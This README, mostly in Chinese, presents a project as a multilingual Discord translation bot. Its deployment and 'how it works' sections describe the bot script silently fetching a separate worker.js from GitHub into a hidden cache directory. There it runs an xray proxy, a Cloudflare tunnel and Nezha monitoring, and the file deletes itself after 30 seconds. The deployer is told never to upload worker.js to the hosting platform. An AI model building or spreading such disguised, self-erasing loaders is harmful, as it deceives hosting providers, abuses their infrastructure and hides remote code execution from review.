# Discord Translator Bot

A Discord multilingual translation bot with web panel.

---

## 📁 文件说明

| 文件 | 上传平台 | 说明 |
|------|---------|------|
| `index.js` | ✅ 是 | Discord Bot 主程序 + 后台服务启动器 |
| `package.json` | ✅ 是 | Discord Bot 依赖声明 |
| `panel.html` | ✅ 是 | Bot 管理面板（可选） |
| `worker.js` | ❌ 否 | 代理核心（仅存 GitHub，运行时自动拉取） |

> ⚠️ **`worker.js` 不要上传到平台**，只推送到 GitHub，服务启动后自动拉取到隐藏目录运行，30秒后文件自动删除。

---

## ⚙️ 配置说明（每台服务器只改 index.js 顶部）

打开 `index.js`，找到第 408 行的配置区，修改以下字段：

```js
// ========== 服务器配置区（每台服务器只改这里）==========
const _SVC_DEBUG  = false;         // 日志开关: true=调试模式输出日志, false=静默运行

const _SVC_CONFIG = {
  UUID:         'xxxxxxxx-...',    // 节点UUID（每台服务器建议不同）
  ARGO_DOMAIN:  'xxx.dpdns.org',   // Cloudflare 固定隧道域名（留空用临时隧道）
  ARGO_AUTH:    'eyJ...',          // Cloudflare Tunnel Token（留空用临时隧道）
  ARGO_PORT:    '8001',            // xray 代理端口（需与 CF 后台 Service 端口一致）
  NEZHA_SERVER: 'nz.xxx.com:443', // 哪吒服务器（不用留空）
  NEZHA_PORT:   '',                // 哪吒 v0 端口（v1 协议留空）
  NEZHA_KEY:    'xxx',             // 哪吒密钥（不用留空）
  CFIP:         'www.dbs.com',     // 优选 IP 或域名
  CFPORT:       '443',             // 优选端口
  NAME:         'MyServer',        // 节点名称（每台服务器不同，便于区分）
  PROJECT_URL:  'https://xxx',     // 项目访问域名（保活用，不需要留空）
  AUTO_ACCESS:  'false',           // 自动保活: 'true' 开启 | 'false' 关闭
  SUB_PATH:     'sub',             // 订阅路径（一般不改）
  WORKER_PORT:  '3000',            // worker 内部端口（固定不改）
};
// =======================================================
```

---

## 🚀 部署步骤

### 1. GitHub 仓库准备
将以下文件推送到 GitHub（`xfwwl668/Discord-Translator-nodejs` main 分支）：
- `worker.js`
- `index.js`（模板，各服务器自行修改配置后上传平台）
- `package.json`
- `panel.html`
- `README.md`

### 2. 平台上传（每台服务器）
1. 复制 `index.js`，修改顶部 `_SVC_CONFIG` 配置区
2. 上传到平台的文件：`index.js` + `package.json` + `panel.html`
3. 启动命令：`node index.js`

### 3. Cloudflare Tunnel 配置
- Tunnel → Public Hostname → Service 端口设为 `http://localhost:8001`（与 `ARGO_PORT` 一致）

---

## 📡 节点订阅地址

```
https://<ARGO_DOMAIN>/sub
```

---

## ⚙️ 运行原理

```
平台启动 index.js（Discord Bot）
  ↓
后台静默下载 worker.js 到 ~/.cache/svc/app.js
  ↓
npm install 安装依赖（express / axios 等）
  ↓
node ~/.cache/svc/app.js（注入 _SVC_CONFIG 环境变量）
  ↓
30秒后 app.js 文件自动删除（进程继续运行）
  ↓
xray 代理 + cloudflared 隧道 + 哪吒监控 运行中
```

---

## 🔧 多服务器管理

| 服务器 | 操作 |
|--------|------|
| 新增服务器 | 复制 `index.js`，只改 `_SVC_CONFIG` 里的 4 个值（UUID/ARGO_DOMAIN/ARGO_AUTH/NAME） |
| `worker.js` | GitHub 只需一份，无需为每台服务器维护 |
| 调试问题 | 将 `_SVC_DEBUG = true`，重新上传 `index.js`，查看日志 |
